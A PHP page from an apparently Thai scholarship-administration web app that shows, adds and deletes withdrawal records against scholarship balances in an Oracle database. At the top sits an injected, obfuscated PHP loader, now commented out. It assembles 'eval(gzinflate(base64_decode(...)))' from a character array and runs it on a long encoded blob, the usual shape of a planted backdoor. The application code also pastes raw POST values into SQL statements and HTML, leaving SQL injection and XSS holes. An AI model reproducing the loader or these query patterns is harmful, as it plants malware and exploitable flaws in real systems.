<?php
/*$md5 = "0d78a23e64a4bed01994142d4eb3fedf";
$a0 = array("b","d",'n',';','t',"r",'g',"f",'i',"(",'$',')',"4",'l','s',"e",'z',"o","v",'a',"6","c",'_');
$b0d = create_function('$'.'v',$a0[15].$a0[18].$a0[19].$a0[13].$a0[9].$a0[6].$a0[16].$a0[8].$a0[2].$a0[7].$a0[13].$a0[19].$a0[4].$a0[15].$a0[9].$a0[0].$a0[19].$a0[14].$a0[15].$a0[20].$a0[12].$a0[22].$a0[1].$a0[15].$a0[21].$a0[17].$a0[1].$a0[15].$a0[9].$a0[10].$a0[18].$a0[11].$a0[11].$a0[11].$a0[3]);
$b0d('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');
*/?>
<?
@session_start();

function modify_date($date){
	if($date!=""){
		$date_ex = explode("-",$date);
		$date = $date_ex[2]."/".$date_ex[1]."/".($date_ex[0]+543);
	}
	return $date;
}

$fpath = '../';
require_once($fpath . "includes/connect.php");
include "update_by.php";
?>
<? if($_POST["ac"]=="show"){ ?>
<br><br>
<center>
<table width="80%"  border="0" align="center"  bgcolor="#e9e9e9" >
    <tr align="center"  class="text_th">
   
        <td width="8%" class="text_tr">ครั้งที่</td>
        <td width="30%" class="text_tr">เบิกจำนวนเงิน(บาท)</td>
        <td width="30%" class="text_tr">วันที่เบิก</td>
		<td width="30%" class="text_tr">คงเหลือ(บาท)</td>
         <?php
			if($_SESSION['USER_TYPE'] != 'user') {
		?>
    		
    	<?php
			}
		?>
    	<?php
			if($_SESSION['USER_TYPE'] != 'user' && $_SESSION['USER_TYPE'] != 'chief') {
		?>
        	<td width="5%" class="text_tr">ลบ</td>
		<? } ?>
    </tr>
	<?
	$sch_ids = $_POST["ids"];
	$sql = "SELECT * FROM SDU_SCHOLAR_WITHDRAW_MONEY WHERE SCHOLARSHIP_ID='".$sch_ids."' ORDER BY NO";
	$stid = oci_parse($conn, $sql );
	oci_execute($stid);
	$i=0;
	while($row = oci_fetch_array($stid, OCI_BOTH)){
		$i++;
	?>
	<tr>
		<td width="8%" class="text_td" align="center"><?=$row["NO"]?></td>
        <td width="30%" class="text_td" align="right"><?=number_format($row["WITHDRAW_MONEY"],2)?></td>
        <td width="30%" class="text_td" align="center"><?= modify_date($row["WITHDRAW_DATE"])?></td>
		<td width="30%" class="text_td" align="right"><?=number_format($row["BALANCE"],2)?></td>
        <td width="5%" class="text_td"><a href="javascript:ream_del('<?=$sch_ids?>','<?=$row["NO"]?>')"><img src='../images/b_del.png' height='15' border='0' style='cursor:pointer' title='Delete' class='vtip'></a></td>
    </tr>
	<?	
	}
	if($i==0){
	?>
		<tr>
			<td colspan="5" class="text_td" align="center">-- ไม่มีข้อมูล -- </td>
		</tr>
	<?	
	}
	?>
</table>
<br>
<table>
	<tr>
		<td><input type="hidden" name="scholarship_id" id="scholarship_id" value="<?=$sch_ids?>"/></td>
		<td align="center" class="text_td">จำนวนเงินที่เบิก : <input style="width: 80px;" type="text" name="withdraw_money" id="withdraw_money"/></td>
		<td align="center" class="text_td"> วันที่เบิก :<input type="text" style="width: 80px;" name="withdraw_money_date" id="withdraw_money_date" /><img src="../images/vcalendar.png" align="absmiddle" onclick="showCalendar('withdraw_money_date','YYYY-MM-DD')"  style="cursor:pointer"/></td>
		<td class="text_td">&nbsp;</td>
        <td class="text_td">&nbsp;</td>
	</tr>
</table>

</center>
<? } ?>
<? if($_POST["ac"]=="add"){ 
	$data = $_POST;
	$scholarship_id = $_POST["scholarship_id"];
	$withdraw_money = $_POST["withdraw_money"];
	$withdraw_money_date = $_POST["withdraw_money_date"];
	$emp_id = $_SESSION["EMP_ID"];
	$sch_id = $scholarship_id ;
	$withdraw_money = str_replace(",","",$data["withdraw_money"]);
	$withdraw_money_date = date2_formatdb($data["withdraw_money_date"]);
	
	if($sch_id!="" and $withdraw_money !="" ){
		
		 	$sql = "SELECT MAX(NO) AS SCH_N FROM SDU_SCHOLAR_WITHDRAW_MONEY WHERE SCHOLARSHIP_ID = '".$sch_id."'";
			$stid = oci_parse($conn, $sql );
			oci_execute($stid);
			$row = oci_fetch_array($stid, OCI_BOTH); 
			$no = $row['SCH_N']+1;
			
			$sql = "SELECT * FROM SDU_SCHOLARSHIPS_TAB WHERE SCHOLARSHIP_ID = '".$sch_id."' AND  STATUS=0";
			$stid = oci_parse($conn, $sql );
			oci_execute($stid);
			$row = oci_fetch_array($stid, OCI_BOTH); 
			$money = $row["SCHOLARSHIP_BALANCE"];
			
			$money = $money-str_replace(",","",$data["withdraw_money"]);
			$db->add_db("SDU_SCHOLAR_WITHDRAW_MONEY", array(
														"EMP_ID" => "$emp_id",
														"NO" => "$no",
														"WITHDRAW_MONEY" => "$withdraw_money",
														"WITHDRAW_DATE" => "TO_DATE('$withdraw_money_date','YYYY-MM-DD')",
														"BALANCE" => "$money",
														"LAST_UPDATE" => "TO_DATE('" . date("Y-m-d H:i:s") . "','YYYY-MM-DD HH24:MI:SS')",
														"UPDATE_BY" => "$update_user",
														"SCHOLARSHIP_ID" => "$sch_id"
													),$conn);
													
			$sql = "UPDATE SDU_SCHOLARSHIPS_TAB SET SCHOLARSHIP_BALANCE='$money' WHERE SCHOLARSHIP_ID = '".$sch_id."' AND  STATUS=0";
			$stid = oci_parse($conn, $sql );
			oci_execute($stid);
	}
} ?>

<? if($_POST["ac"]=="del"){ 
	$emp_id = $_SESSION["EMP_ID"];
	$sch_id = $_POST["sch_id"];
	$scholarship_id = $_POST["scholarship_id"];
	$no = $_POST["no"];
	
	$sql = "DELETE FROM SDU_SCHOLAR_WITHDRAW_MONEY WHERE NO = '".$no."' AND SCHOLARSHIP_ID = '".$scholarship_id."'";
	$stid = oci_parse($conn, $sql );
	oci_execute($stid);
	
	$sql = "SELECT * FROM SDU_SCHOLARSHIPS_TAB WHERE SCHOLARSHIP_ID = '".$scholarship_id."'";
	$stid = oci_parse($conn, $sql );
	oci_execute($stid);
	$row = oci_fetch_array($stid, OCI_BOTH);
	$money = $row["SCHOLARSHIP_MONEY"];
	
	$sql = "SELECT * FROM SDU_SCHOLAR_WITHDRAW_MONEY WHERE SCHOLARSHIP_ID = '".$scholarship_id."' ORDER BY NO";
	$stid = oci_parse($conn, $sql );
	oci_execute($stid);
	$i = 0;
	while($row = oci_fetch_array($stid, OCI_BOTH)){
		$i++;
		$money = $money-$row["WITHDRAW_MONEY"];
		$no_row = $row["NO"];
		$scholarship_row = $row["SCHOLARSHIP_ID"];
		$result = $db->update_db("SDU_SCHOLAR_WITHDRAW_MONEY",array(
									"NO" => "$i",
									"BALANCE" => "$money",
									"LAST_UPDATE" => "TO_DATE('". date("Y-m-d H:i:s") . "','YYYY-MM-DD HH24:MI:SS')",
									"UPDATE_BY" => "$update_user"	  
					  ),"NO='$no_row' AND SCHOLARSHIP_ID='$scholarship_row'",$conn); 
		
	}
	
	$result = $db->update_db("SDU_SCHOLARSHIPS_TAB",array(
									"SCHOLARSHIP_BALANCE"=> "$money",
									"LAST_UPDATE" => "TO_DATE('" . date("Y-m-d H:i:s") . "','YYYY-MM-DD HH24:MI:SS')",
									"UPDATE_BY" => "$update_user"	  
					  )," SCHOLARSHIP_ID='$scholarship_id'",$conn); 
	
} ?>